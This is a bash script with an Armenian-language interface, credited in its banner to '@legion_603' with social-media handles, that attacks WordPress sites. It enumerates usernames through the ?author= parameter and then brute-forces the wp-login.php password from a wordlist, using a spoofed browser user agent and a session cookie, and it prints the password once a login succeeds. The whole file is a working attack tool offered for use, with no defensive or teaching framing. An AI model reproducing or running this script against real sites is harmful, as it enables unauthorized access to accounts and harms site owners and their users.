#!/bin/bash
# legion_603

USERAGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT=1
COOKIE=cookie-`date +%s`
COOKIEPATH="/tmp/$COOKIE"

GREEN='\e[32m'
RED='\e[31m'
ORANGE='\e[33m'
BLUE='\e[34m'
NC='\e[0m' # No Color


# Print Banner.
echo -e "\e[1;31m  

   ${RED}Ar${BLUE}me${ORANGE}nia${NC}    


\e[1;34m  by @legion_603 

${BLUE}Telegram: https://t.me/hoparner ${NC}

${RED}Tik${NC}Tok:${GREEN}@legion_603
"

# Help
helpMenu(){
    echo -e "${RED}Թվարկում:\n\t--url(հղում)\t\twordpress url(հղում)${BLUE}\n\t--user\t\twordpress username(օգտանուն)\n\t${ORANGE}--wordlist\tգա ղտ նա բա ռի բա ռ   ցա նկ  տ ա նող ճա նա պ ա ր հ ը\n${NC}"
    echo -e "${RED}Օգտագործողի թվարկում:${BLUE}\n./word.sh --url=www.example.com\n\nՕ՝րինա կ:\n.${ORANGE}/word.sh --url=www.example.com --user=admin --wordlist=password.txt"
}


# Test wordpress url
testUrl(){
    CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
    if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
}

# User Enumeration
userEnum(){
    echo "[+]Օգտագործողի կամ մականունի թվարկում"
    for i in {1..10}
    do
        users=($(curl -s -A "$USERAGENT" -L -i $WP_URL/?author=$i | grep "\/author\/.*\/?mode" | cut -d\/ -f3))
        if [[ $users ]]; then
            echo $users
            echo $WP_URL/?author=$i
        fi
    done
    exit
}

# Get arguments
agrumentArry=( $@ )
argumentLenth=${#agrumentArry[@]}

# Check arguments
if [ "$argumentLenth" -eq 1 ]; then
    WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
    testUrl
    userEnum
fi

if [ "$argumentLenth" -ne 3 ]; then
    helpMenu
    exit

else
    # Get value
    WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
    WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
    if [ ! -f "$WP_PASSWORD" ]; then echo "Բառացանկը չի գտնվել: $WP_PASSWORD"; exit; fi
    WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
    testUrl
fi

# Get cookie
curl -s -A "$USERAGENT" -c "$COOKIEPATH" $WP_URL/wp-login.php > /dev/null

# Bruteforce
echo "[+] Bruteforcing օգտվող [$WP_ADMIN]"
cat "$WP_PASSWORD" | while read line;
do {
        echo $line
        REQ=`curl -s -b "$COOKIEPATH" -A "$USERAGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Մուտք գործեք" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
        
        if [ "$REQ" == "" ]; then echo "Գաղտնաբառն է: $line"; rm "$COOKIEPATH"; exit; fi
    }
done


rm "$COOKIEPATH" 2> /dev/null